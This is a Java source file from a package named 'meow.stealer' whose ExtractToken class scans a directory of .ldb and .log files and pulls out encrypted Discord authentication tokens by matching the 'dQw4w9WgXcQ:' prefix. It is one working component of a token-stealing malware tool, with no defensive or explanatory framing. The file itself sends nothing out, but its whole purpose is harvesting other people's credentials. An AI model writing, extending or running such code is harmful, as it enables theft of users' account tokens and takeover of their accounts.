package meow.stealer;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ExtractToken {
    public static List<String> token(String path) throws IOException {
        Pattern encryptedToken = Pattern.compile("dQw4w9WgXcQ:[^\"]*", Pattern.CASE_INSENSITIVE);

        if(path == null) {
            System.out.println("-1");
            return null;
        }

        if(!Paths.get(path).toFile().exists()) {
            System.out.println("-2");
            return null;
        }

        Path ldb = Paths.get(path);
        List<String> tokens = new ArrayList<String>(){};

        for(File file : ldb.toFile().listFiles()) {
            System.out.println(file.getAbsolutePath());
            if(file.getAbsolutePath().endsWith(".ldb") || file.getAbsolutePath().endsWith(".log")) {
                try {
                    System.out.println("Reading file: " + file.getAbsolutePath());
                    Path filePath = Paths.get(file.getAbsolutePath());
                    List<String> lines = Files.readAllLines(filePath, StandardCharsets.ISO_8859_1);
                    System.out.println("Lines: " + lines.size());
                    for (String line : lines) {
                        Matcher matcher = encryptedToken.matcher(line);
                        if (matcher.find()) {
                            tokens.add(matcher.group(0).split(":")[1]);
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            } else {
                System.out.println("file doesn't end with .ldb or .log");
            }

        }
        System.out.println("0");
        return tokens;
    }
}
